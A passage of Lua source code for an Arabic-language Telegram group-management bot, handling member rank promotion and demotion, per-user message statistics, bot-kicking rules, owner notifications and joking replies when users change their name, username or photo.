Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..data.first_name_..'](t.me/'..(data.username_ or 'loolIQ')..')'..' ◟\n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n❗️⚜️ ⌯ تـۖم تنزيلة ◝ '..DEV_ABBAS..' ◟ بنجٱح \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
DevAbs:srem(loolIQ..'abs:vipmem'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..data.first_name_..'](t.me/'..(data.username_ or 'loolIQ')..')'..' ◟\n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n❗️⚜️ ⌯ تـۖم تنزيلة ◝ '..DEV_ABBAS..' ◟ بنجٱح \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
DevAbs:srem(loolIQ..'abs:admins'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "مدير" and is_monshid(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..data.first_name_..'](t.me/'..(data.username_ or 'loolIQ')..')'..' ◟\n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n❗️⚜️ ⌯ تـۖم تنزيلة ◝ '..DEV_ABBAS..' ◟ بنجٱح \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
DevAbs:srem(loolIQ..'abs:owners:'..msg.chat_id_, result.sender_user_id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_)
elseif mrabs == "عضو" and is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..data.first_name_..'](t.me/'..(data.username_ or 'loolIQ')..')'..' ◟\n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n❗️⚜️ ⌯ تـۖم تنزيلة ◝ '..DEV_ABBAS..' ◟ بنجٱح \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
end,nil)   
end   
tdcli_function ({ ID = "GetMessage", chat_id_ = msg.chat_id_, message_id_ = tonumber(msg.reply_to_message_id_) }, by_reply, nil)
end
end
if text and text:match("^رفع (.*) @(.*)") then 

local text1 = {string.match(text, "^(رفع) (.*) @(.*)$")}
if DevAbs:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrabs = DevAbs:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if mrabs == "مميز" and is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..data.first_name_..'](t.me/'..(data.username_ or 'loolIQ')..')'..' ◟\n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n❗️⚜️ ⌯ تـۖم رفعه ◝ '..text1[2]..' ◟ بنجٱح \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
DevAbs:sadd(loolIQ..'abs:vipmem'..msg.chat_id_, result.id_)
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..data.first_name_..'](t.me/'..(data.username_ or 'loolIQ')..')'..' ◟\n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n❗️⚜️ ⌯ تـۖم رفعه ◝ '..text1[2]..' ◟ بنجٱح \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
DevAbs:sadd(loolIQ..'abs:admins'..msg.chat_id_, result.id_)
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "مدير" and is_monshid(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..data.first_name_..'](t.me/'..(data.username_ or 'loolIQ')..')'..' ◟\n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n❗️⚜️ ⌯ تـۖم رفعه ◝ '..text1[2]..' ◟ بنجٱح \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
DevAbs:sadd(loolIQ..'abs:owners:'..msg.chat_id_, result.id_)
DevAbs:set(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_,text1[2])
elseif mrabs == "عضو" and is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..data.first_name_..'](t.me/'..(data.username_ or 'loolIQ')..')'..' ◟\n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n❗️⚜️ ⌯ تـۖم رفعه ◝ '..text1[2]..' ◟ بنجٱح \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
else
info = "*❗️📛 ⌯ ٱڵمعرف غير صحيح*"
Dev_Abs(msg.chat_id_, msg.id_, 1, info, 1, 'html')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end 
end
if text and text:match("^تنزيل (.*) @(.*)") then 

local text1 = {string.match(text, "^(تنزيل) (.*) @(.*)$")}
if DevAbs:sismember(bot_id.."Coomds"..msg.chat_id_,text1[2]) then
function py_username(extra, result, success)   
if result.id_ then
local mrabs = DevAbs:get(bot_id.."Comd:New:rt:bot:"..text1[2]..msg.chat_id_)
if mrabs == "مميز" and is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..data.first_name_..'](t.me/'..(data.username_ or 'loolIQ')..')'..' ◟\n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n❗️⚜️ ⌯ تـۖم تنزيلة ◝ '..text1[2]..' ◟ بنجٱح \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
DevAbs:srem(loolIQ..'abs:vipmem'..msg.chat_id_, result.id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "ادمن" and is_owner(msg.sender_user_id_, msg.chat_id_) then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..data.first_name_..'](t.me/'..(data.username_ or 'loolIQ')..')'..' ◟\n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n❗️⚜️ ⌯ تـۖم تنزيلة ◝ '..text1[2]..' ◟ بنجٱح \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
DevAbs:srem(loolIQ..'abs:admins'..msg.chat_id_, result.id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "مدير" and is_monshid(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..data.first_name_..'](t.me/'..(data.username_ or 'loolIQ')..')'..' ◟\n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n❗️⚜️ ⌯ تـۖم تنزيلة ◝ '..text1[2]..' ◟ بنجٱح \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
DevAbs:srem(loolIQ..'abs:owners:'..msg.chat_id_, result.id_)
DevAbs:del(bot_id.."Comd:New:rt:User:"..msg.chat_id_..result.id_)
elseif mrabs == "عضو" and is_admin(msg.sender_user_id_, msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎗 ⌯ ٱڵـعضو ⌯» ◝ ['..data.first_name_..'](t.me/'..(data.username_ or 'loolIQ')..')'..' ◟\n❗️🔑 ⌯ ٱيـۧديـۧه ⌯» ◝ '..result.sender_user_id_..' ◟\n❗️⚜️ ⌯ تـۖم تنزيلة ◝ '..text1[2]..' ◟ بنجٱح \n❗️🚸 ⌯ بوٱسـۧطة ⌯» '..abs_rank(msg)..' \n ', 1, 'md')
end
else
info = "*❗️📛 ⌯ ٱڵمعرف غير صحيح*"
Dev_Abs(msg.chat_id_, msg.id_, 1, info, 1, 'html')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = text1[3]},py_username,nil) 
end  
end
--     Source loolIQ     --
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
DevAbs:incr(loolIQ..'msg'..msg.chat_id_..':'..msg.sender_user_id_) 
Chat_Type = 'gg' 
elseif id:match("^(%d+)") then
DevAbs:sadd(loolIQ..'bot',msg.sender_user_id_)  
Chat_Type = 'pv' 
else
Chat_Type = 'gg' 
end
end 
--     Source loolIQ     --
if Chat_Type == 'pv' then 
if text == '/start' then  
if is_leader(msg) then
local Sudo_Welcome = '*❗️🚸 ⌯ مرحبٱ عزيزي ٱڵـمطور \n❗️🔑 ⌯ ٱنت ٱڵمطور ٱلٱسٱسي هنٱ \n❗️🔅 ⌯ ٱڵيك ٱزرٱر سورس ديف بروكس \n❗️🎗 ⌯ تستطيع ٱڵتحكم بكل ٱلٱوٱمر فقط ٱضغط على ٱلٱمر ٱڵذي تريد تنفيذه*'
local key = {
{'وضع اسم البوت','تحديث','ضع كليشه المطور'},
{'الكروبات','المطورين','الاحصائيات'},
{'ضع دعم','اوامر الاذاعه','قائمه العام'},
{'تعطيل البوت الخدمي','تفعيل البوت الخدمي'},
{'نسخه ملف السورس','تحديث السورس','جلب نسخه الكروبات'},
{'حذف رد عام','الردود العام','اضف رد عام'},
{'حذف قناة الاشتراك','قناة الاشتراك','تعيين قناة الاشتراك'},
{'حذف كليشه الاشتراك','كليشه الاشتراك','تغيير كليشه الاشتراك'},
{"رد الخاص تعطيل",'تعيين كليشة ستارت',"رد الخاص تفعيل"},
}
send_inline(msg.chat_id_,Sudo_Welcome,key)
return false
end end end
if Chat_Type == 'pv' then 
if text == '/start' then  
function adding(extra,result,success)
local users = DevAbs:scard(loolIQ.."bot:userss")
Dev_Abs(tostring((DevAbs:get(loolIQ.."bot:leader:gr") or bot_owner)), 0, 1, "❗️🎒 ⌯ هنٱك مشترك جديد في ٱڵبوت \n〰️➖〰️➖〰️➖〰️➖〰️\n❗️🚸 ⌯ معرفه ⌯» ◝ @"..(result.username_ or "لا يوجد").." ◟\n❗️🔑 ⌯ ٱيديه ⌯» ◝ "..msg.sender_user_id_.." ◟\n❗️🔅 ⌯ عدد مشتركين ٱڵبوت ⌯» ◝ "..users.." ◟" , 1, 'html') 
end 
getUser(msg.sender_user_id_,adding) 
end
end
if Chat_Type == 'pv' then 
if text and text:match("/start hms(.*)_(%d+)") then 
function adding(extra,result,success)
Dev_Abs(tostring((DevAbs:get(loolIQ.."bot:leader:gr") or bot_owner)), 0, 1, "❗️🎒 ⌯ هذٱ دز ستٱرت ڵڵبوت عن طريق ٱڵهمسه \n〰️➖〰️➖〰️➖〰️➖〰️\n❗️🚸 ⌯ معرفه ⌯» ◝ @"..(result.username_ or "لا يوجد").." ◟\n❗️🔑 ⌯ ٱيديه ⌯» ◝ "..msg.sender_user_id_.." ◟" , 1, 'html') 
end 
getUser(msg.sender_user_id_,adding) 
end 
end 
if is_leader(msg) then
if text == 'تعيين كليشة ستارت' then Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎒 ⌯ تعيين كڵيشة ٱڵترحيب : \n〰️➖〰️➖〰️➖〰️➖〰️\nضع رد الخاص + الكليشة \n❗️🔑 ⌯ مثال : ضع رد الخاص مرحبا \n❗️🚸 ⌯ بعد ذڵك ٱرسڵ ٱمـر : \n{ رد الخاص تفعيل } \n〰️➖〰️➖〰️➖〰️➖〰️ \n ', 1, 'md') end
if text == 'اوامر الاذاعه' then Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🎒 ⌯ آوآمر آلآذآعة : \n〰️➖〰️➖〰️➖〰️➖〰️\n❗️📥 ⌯ اذاعه + الكليشه \n❗️📬 ⌯ توجيه للكل + بالرد على الرسالة \n❗️📯 ⌯ نشر • الاذاعه بالخاص + الكليشه  \n〰️➖〰️➖〰️➖〰️➖〰️ \n ', 1, 'md') end end
--     Source loolIQ     --
DevAbs:sadd(loolIQ.."groups:users" .. msg.chat_id_, msg.sender_user_id_)--save users gp
DevAbs:incr(loolIQ.."msgs:"..msg.sender_user_id_..":"..msg.chat_id_.."")--save msgs gp
if msg.content_.ID == "MessageChatDeleteMember" then
if tonumber(msg.content_.user_.id_) == tonumber(bot_id) then
DevAbs:del(loolIQ.."bot:enable:" .. msg.chat_id_)
DevAbs:srem(loolIQ.."bot:groups", msg.chat_id_) 
end end 
function chek_admin(chat_id,set) 
local function promote_admin(extra,result,success)   
limit = result.administrator_count_   
if tonumber(limit) > 0 then 
getChannelMembers(chat_id, 0, 'Administrators', limit,set)   
end
end
getChannelFull(chat_id,promote_admin)
end
function channel_get_kicked(channel,cb)
local function callback_admins(extra,result,success)
limit = result.kicked_count_
getChannelMembers(channel, 0, 'Kicked', limit,cb)
end
getChannelFull(channel,callback_admins)
end
function deleteMessagesFromUser(chat_id, user_id)
tdcli_function ({
ID = "DeleteMessagesFromUser",
chat_id_ = chat_id,
user_id_ = user_id
}, dl_cb, nil)
end
function forwardMessages(chat_id, from_chat_id, message_ids, disable_notification)
tdcli_function ({
ID = "ForwardMessages",
chat_id_ = chat_id,
from_chat_id_ = from_chat_id,
message_ids_ = message_ids, -- vector
disable_notification_ = disable_notification,
from_background_ = 1
}, dl_cb, nil)
end
function getUser(user_id, cb)
    tdcli_function ({
  ID = "GetUser",
  user_id_ = user_id
    }, cb, nil)
  end
local msg = data.message_
text = msg.content_.text_
if text and not DevAbs:get(loolIQ..'lock:bot:ttt'..bot_id) and not DevAbs:get(loolIQ.."lock:bot:ttt2:"..msg.chat_id_) then 
function ABS_PROX(extra,result,success)
if result.id_ then 
local abbs = DevAbs:get("ABS_PROX:name"..result.id_)
if not result.first_name_ then 
if abbs then 
DevAbs:del("ABS_PROX:name"..result.id_) 
end
end
if result.first_name_ then 
if abbs and abbs ~= result.first_name_ then 
local abs_text = {
  "اسمك الجديد { "..result.first_name_.." }\n ليش غيرته 🌚😹",
  "غير اسمه ابن الكانسر عود شوفوني صرت ءكيوت🥺😂💘",
  "ليش غيرت اسمك { "..result.first_name_.." }\n قطيت احد حبي ؟ 🌚😹",
  "اسمك الجديد { "..result.first_name_.." } فد شي وين زخرفته🙂💗", 
}
abbss = math.random(#abs_text)
Dev_Abs(msg.chat_id_, msg.id_, 1, abs_text[abbss], 1, 'html')
end  
DevAbs:set("ABS_PROX:name"..result.id_, result.first_name_)  
end
end
end
getUser(msg.sender_user_id_, ABS_PROX)
end
local msg = data.message_
text = msg.content_.text_
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and DevAbs:get(loolIQ.."bot:bots:ban" .. msg.chat_id_) and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
chat_kick(msg.chat_id_, msg.sender_user_id_)
end  
end  
end
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and DevAbs:get(loolIQ.."bot:bots:mute" .. msg.chat_id_) and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
end  
end  
end
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and DevAbs:get(loolIQ.."keed_bots"..msg.chat_id_)  and not is_vipmem(msg.sender_user_id_, msg.chat_id_) then
chat_kick(msg.chat_id_,mem_id[i].id_)
DevAbs:sadd(loolIQ..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
HTTPS.request("https://api.telegram.org/bot" .. tokenbot .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. msg.sender_user_id_ .. "&can_send_messages=false&can_send_media_messages=false&can_send_other_messages=false&can_add_web_page_previews=false")
DevAbs:sadd(loolIQ..'bot:keed:'..msg.chat_id_, msg.sender_user_id_)
end  
end  
end
if msg.content_.ID == "MessageChatDeleteMember" and tonumber(msg.content_.user_.id_) == tonumber(loolIQ) then 
DevAbs:srem("ABS_PROX:addg"..bot_id, msg.chat_id_) 
DevAbs:del(loolIQ.."bot:charge:"..msg.chat_id_)
function ABS_PROX(extra,result,success) 
function  reslit(f1,f2)
function loolIQ3(t1,t2)
tdcli_function ({ ID = "GetChat", chat_id_ = bot_owner },function(arg,chat)  
Dev_Abs(tostring((DevAbs:get(loolIQ.."bot:leader:gr") or bot_owner)), 0, 1, "⛑ • تم طرد البوت من المجموعه • \n〰️➖〰️➖〰️➖〰️➖〰️\n📮 • ايدي الطردني : ("..msg.sender_user_id_..")\n🧯 • معرف الطردني  (@"..(result.username_ or "لا يوجد")..")\n〰️➖〰️➖〰️➖〰️➖〰️\n🎒 • معلومات المجموعه • \n〰️➖〰️➖〰️➖〰️➖〰️\n🦠 • ايدي المجموعه : ("..msg.chat_id_..")\n🧬 • اسم المجموعه : ("..f2.title_..")\n💢 • تم حذف جميع بياناتها • \n " , 1, 'html')
end,nil)   
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, loolIQ3, nil)
end
tdcli_function ({
ID = "GetChat",
chat_id_ = msg.chat_id_
}, reslit, nil) 
end
getUser(msg.sender_user_id_, ABS_PROX)
end
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if DevAbs:get(loolIQ..'bot:tgservice:jk'..msg.chat_id_) then
local id = msg.id_
local msgs = {[0] = id}
local chat = msg.chat_id_
delete_msg(chat,msgs)    
end   
end
local msg = data.message_
text = msg.content_.text_
if text and not DevAbs:get(loolIQ..'lock:bot:ttt'..bot_id) and not DevAbs:get(loolIQ.."lock:bot:ttt2:"..msg.chat_id_) then  
function ABS_PROX(extra,result,success)
if result.id_ then 
local abbs = DevAbs:get("ABS_PROX:Userr"..result.id_)
if not result.username_ then 
if abbs then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بسرعه 😹💔 \nهذٱ معرفه : [@"..abbs.."]", 1, 'html')
DevAbs:del("ABS_PROX:Userr"..result.id_) 
end
end
if result.username_ then 
if abbs and abbs ~= result.username_ then 
local abs_text = {
  'معرفك الجديد عشره بربع محد ياخذه😹💔',
  "هاها غيرت معرفك نشروك بقناة فضايح😹💔💭",
  "معرفك الجديد حلو منين اخذته؟!😐🙄💗",
  "معرفك القديم @"..result.username_.." ضمه بقناة لاينبعص🙂😹💕",
}
abbss = math.random(#abs_text)
Dev_Abs(msg.chat_id_, msg.id_, 1, abs_text[abbss], 1, 'html')
end  
DevAbs:set("ABS_PROX:Userr"..result.id_, result.username_) 
end
end
end
getUser(msg.sender_user_id_, ABS_PROX)
end
local msg = data.message_
text = msg.content_.text_
if text and not DevAbs:get(loolIQ..'lock:bot:ttt'..bot_id) and not DevAbs:get(loolIQ.."lock:bot:ttt2:"..msg.chat_id_) then  
function abbs(extra,result,success)
if result.id_ then 
local abbs2 = DevAbs:get("abbs:photo"..result.id_)
if not result.profile_photo_ then 
if abbs2 then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "حذف كڵ صوره مضروب بوري 😹💔", 1, 'html')
DevAbs:del("abbs:photo"..result.id_) 
end
end
if result.profile_photo_ then 
if abbs2 and abbs2 ~= result.profile_photo_.big_.persistent_id_ then 
local abbs_text = {
  "صورتك الجديده صعدت عندي الجالي😒😹💔",
  "صورتك الجديده فيطي غيرها،😕😹💗",
  "منور طالع حلو علصوره الجديده😍💘",
  "برن طرن غير صورته الحلو علمود البنات😹💕",
  "اححح شنيي هلصوره الجديده🤤💘",
}
abbs3 = math.random(#abbs_text)
Dev_Abs(msg.chat_id_, msg.id_, 1, abbs_text[abbs3], 1, 'html')
end  
DevAbs:set("abbs:photo"..result.id_, result.profile_photo_.big_.persistent_id_) 
end
end
end
getUser(msg.sender_user_id_, abbs)
end
local function openChat(chat_id,dl_cb)
tdcli_function ({
ID = "GetChat",
chat_id_ = chat_id
}, dl_cb, nil) 
end
function resolve_username(username,cb)
tdcli_function ({
ID = "SearchPublicChat",
username_ = username
}, cb, nil)
end
function title_name(GroupID)
tdcli_function({ID ="GetChat",chat_id_=GroupID},function(arg,data)---title_name
DevAbs:set(loolIQ..'group:name'..GroupID,data.title_) end,nil) return DevAbs:get(loolIQ..'group:name'..GroupID) end
--     Source loolIQ     --
function string:split(sep)
local sep, fields = sep or ":", {}
local pattern = string.format("([^%s]+)", sep)
self:gsub(pattern, function(c) fields[#fields+1] = c end)
return fields
end
function ababes(msg,data) 
local msg = data.message_
local text = msg.content_.text_
local caption = msg.content_.caption_
if text ==('تفعيل') and not is_sudo3(msg.sender_user_id_, msg.chat_id_) and not DevAbs:get(loolIQ..'lock:bot:free'..bot_id) then
function adding(extra,result,success)
local function promote_admin(extra, result, success)
local num = 0
local admins = result.members_  
for i=0 , #admins do   
num = num + 1
DevAbs:sadd(loolIQ..'abs:admins'..msg.chat_id_,admins[i].user_id_)
if result.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
DevAbs:sadd(loolIQ.."abs:monsh:"..msg.chat_id_,owner_id)
end end end
getChannelMembers(msg.chat_id_, 0, 'Administrators', 200, promote_admin)
if DevAbs:get(loolIQ.."bot:enable:"..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ٱڵمجـمۄعة ،بٱڵتاكيد ،مۧفعڵـة', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️☻ تـۖم تـفعيـۧڵ ٱڵبـۄت فيۧ ٱڵمجـمۄعة\n❗️🚸 ⌯ بوٱسـۧطة ⌯» ◝ '..msg.sender_user_id_..' ◟', 1, 'md')
openChat(msg.chat_id_,ABS_PROX)
DevAbs:sadd("ABS_PROX:addg"..bot_id, msg.chat_id_)
function ABS_PROX(f1,f2)
function loolIQ3(t1,t2)
if t2.invite_link_ == false then 
local getlink = 'https://api.telegram.org/bot'..tokenbot..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
  t2.invite_link_ = link.result
end
end
DevAbs:set(loolIQ.."bot:group:link"..msg.chat_id_,(t2.invite_link_ or "Error")) 
Dev_Abs(tostring((DevAbs:get(loolIQ.."bot:leader:gr") or bot_owner)), 0, 1, "⛑ • تم تفعيل مجموعه جديده • \n〰️➖〰️➖〰️➖〰️➖〰️\n📮 • ايدي الضافني :  ("..msg.sender_user_id_..")\n🧯 • معرف الضافني : @"..(result.username_ or "لا يوجد").."\n〰️➖〰️➖〰️➖〰️➖〰️\n🎒 • معلومات المجموعه • \n〰️➖〰️➖〰️➖〰️➖〰️\n🦠 • ايدي المجموعه : ("..msg.chat_id_..")\n🧬 • اسم المجموعه : ("..f2.title_..")\n🧩 • رابط المجموعه : \n📍 • ("..(t2.invite_link_ or "Error")..") •" , 1, 'html') 
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, loolIQ3, nil)
end
openChat(msg.chat_id_,ABS_PROX) 
DevAbs:set(loolIQ.."bot:enable:"..msg.chat_id_,true)
DevAbs:setex(loolIQ.."bot:charge:"..msg.chat_id_,86400,true)
DevAbs:sadd("ABS_PROX:addg"..bot_id, msg.chat_id_)
end end
getUser(msg.sender_user_id_,adding) 
end end
--     Source loolIQ     --
if (data.ID == "UpdateNewMessage") then
local msg = data.message_
--vardump(data)
local d = data.disable_notification_
local chat = chats[msg.chat_id_]
ababes(data.message_,data) 
--     Source loolIQ     --
if msg.date_ < (os.time() - 30) then
print("*( OLD MESSAGE )*")
return false
end
--     Source loolIQ     --
-----Expire & AutoLeave-----
---------Secretary----------
if DevAbs:get(loolIQ.."clerk") == "On" then
function clerk(extra, result, success)
local id = tostring(msg.chat_id_)
if id:match("^(%d+)") then
if not is_sudo3(msg.sender_user_id_) then
local text = DevAbs:get(loolIQ.."textsec")
if not DevAbs:get(loolIQ.."secretary:"..msg.chat_id_) then
if text then
local text = text:gsub('FIRSTNAME',(result.first_name_ or ''))
local text = text:gsub('LASTNAME',(result.last_name_ or ''))
local text = text:gsub('USERNAME',('@'..result.username_ or ''))
local text = text:gsub('USERID',(result.id_ or ''))
Dev_Abs(msg.chat_id_, msg.id_, 1, text, 1, 'md')
DevAbs:setex(loolIQ.."secretary:"..msg.chat_id_,86400,true)
return false
else
return ""
end
end
end
end
end
getUser(msg.sender_user_id_,clerk)
end
--     Source loolIQ     --
local idf = tostring(msg.chat_id_)
if not DevAbs:get(loolIQ.."bot:enable:"..msg.chat_id_) and not idf:match("^(%d+)") and not is_sudo3(msg.sender_user_id_, msg.chat_id_) then
print("Return False [ Not Enable ]")
return false
end
--     Source loolIQ     --
if msg and msg.send_state_.ID == "MessageIsSuccessfullySent" then
function get_mymsg_contact(extra, result, success)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,get_mymsg_contact)
return
end
--     Source loolIQ     --
DevAbs:incr(loolIQ.."bot:allmsgs")
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match('-100(%d+)') then
if msg.can_be_deleted_ == true then 
DevAbs:sadd(loolIQ.."bot:groups",msg.chat_id_)
end
if not DevAbs:sismember(loolIQ.."bot:groups",msg.chat_id_) then
DevAbs:sadd(loolIQ.."bot:groups",msg.chat_id_)
end
elseif id:match('^(%d+)') then
if not DevAbs:sismember(loolIQ.."bot:userss",msg.chat_id_) then
DevAbs:sadd(loolIQ.."bot:userss",msg.chat_id_)
end
else
if not DevAbs:sismember(loolIQ.."bot:groups",msg.chat_id_) then
DevAbs:sadd(loolIQ.."bot:groups",msg.chat_id_)
end
end
end
--     Source loolIQ     --
-------- MSG TYPES ---------
if msg.content_ then
if msg.reply_markup_ and msg.reply_markup_.ID == "ReplyMarkupInlineKeyboard" then
print("This is [ Inline ]")
msg_type = 'MSG:Inline'
end
--     Source loolIQ     --
if msg.content_.ID == "MessageText" then
text = msg.content_.text_
print("This is [ Text ]")
msg_type = 'MSG:Text'
end
--     Source loolIQ     --
 if msg.content_.ID == "MessageChatAddMembers" then
DevAbs:incr(loolIQ..'bot:user:add'..msg.chat_id_..':'..msg.sender_user_id_)
end
if msg.content_.ID == "MessagePhoto" then
DevAbs:incr(loolIQ.."Photo:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageAnimation" then
DevAbs:incr(loolIQ.."Gif:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageVideo" then
DevAbs:incr(loolIQ.."Video:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageVoice" then
DevAbs:incr(loolIQ.."Voice:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
if msg.content_.ID == "MessageSticker" then
DevAbs:incr(loolIQ.."sticker:"..msg.sender_user_id_..":"..msg.chat_id_.."")
end
--     Source loolIQ     --
if msg.content_.ID == "MessagePhoto" then
print("This is [ Photo ]")
msg_type = 'MSG:Photo'
end
--     Source loolIQ     --
if msg.content_.ID == "MessageChatAddMembers" then
print("This is [ New User Add ]")
msg_type = 'MSG:NewUserAdd'
end
--     Source loolIQ     --
if msg.content_.ID == "MessageDocument" then
print("This is [ File Or Document ]")
msg_type = 'MSG:Document'
end
--     Source loolIQ     --
if msg.content_.ID == "MessageSticker" then
print("This is [ Sticker ]")
msg_type = 'MSG:Sticker'
end
--     Source loolIQ     --
if msg.content_.ID == "MessageAudio" then
print("This is [ Audio ]")
msg_type = 'MSG:Audio'
end
--     Source loolIQ     --
if msg.content_.ID == "MessageVoice" then
print("This is [ Voice ]")
msg_type = 'MSG:Voice'
end
